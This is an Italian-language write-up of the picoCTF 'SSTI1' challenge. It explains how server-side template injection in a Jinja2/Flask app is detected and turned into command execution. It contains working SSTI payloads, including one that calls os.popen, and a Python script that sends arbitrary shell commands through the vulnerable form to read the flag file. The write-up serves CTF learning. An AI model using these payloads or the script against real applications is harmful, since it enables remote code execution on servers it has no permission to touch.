## Risoluzione della sfida SSTI1 di PicoCTF

Si tratta di **Server-Side Template Injection (SSTI)**.  
### **1. Riconoscimento della vulnerabilità**

- Inserendo `{{ 7 * 7 }}` in un campo del form, abbiamo ottenuto `49`.
- Il fatto che `{{ 7 * 7 }}` venga valutato come `49` indica che il server sta interpretando il contenuto inserito come codice template (probabilmente **Jinja2**, usato in Flask, o un motore simile).
### **2. Conferma del motore template**

- Abbiamo testato `{{ 7 * '7' }}` → risultato `7777777`.
- Questo comportamento (moltiplicazione stringa * intero = ripetizione) è tipico di Jinja2, basato su Python.
### **3. Esplorazione dell’ambiente Python via SSTI**

- Payload usato per ottenere la gerarchia delle classi:  
`{{ ''.__class__.__mro__[1].__subclasses__() }}`
- Questo restituisce una lista di tutte le classi disponibili nel sistema, ereditabili da `object`.
### **4. Esecuzione di comandi**

- Con `Popen`, abbiamo eseguito `whoami` per avere le informazioni sull'uetnte:
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}`

### **5. Script python**

Con questo script python possiamo lanciare direttamente dei comandi di shell:
```python
import requests
import re

# endpoint che stampa le risposte
main_url = "http://rescued-float.picoctf.net:58153/announce"

while True:
    user_input = input("[]> ")
    data_post = {
        "content": '{{self.__init__.__globals__.__builtins__.__import__("os").popen("' + user_input + '").read()}}'
    }
    
    r = requests.post(main_url, data=data_post)
    response = re.findall(r'align="center">(.*)</h1>', r.text,re.DOTALL)[0]
    print(response)
```

Con il comando `ls -l` possiamo vedere i file della directory tra cui il file *flag* che contiene la flag.
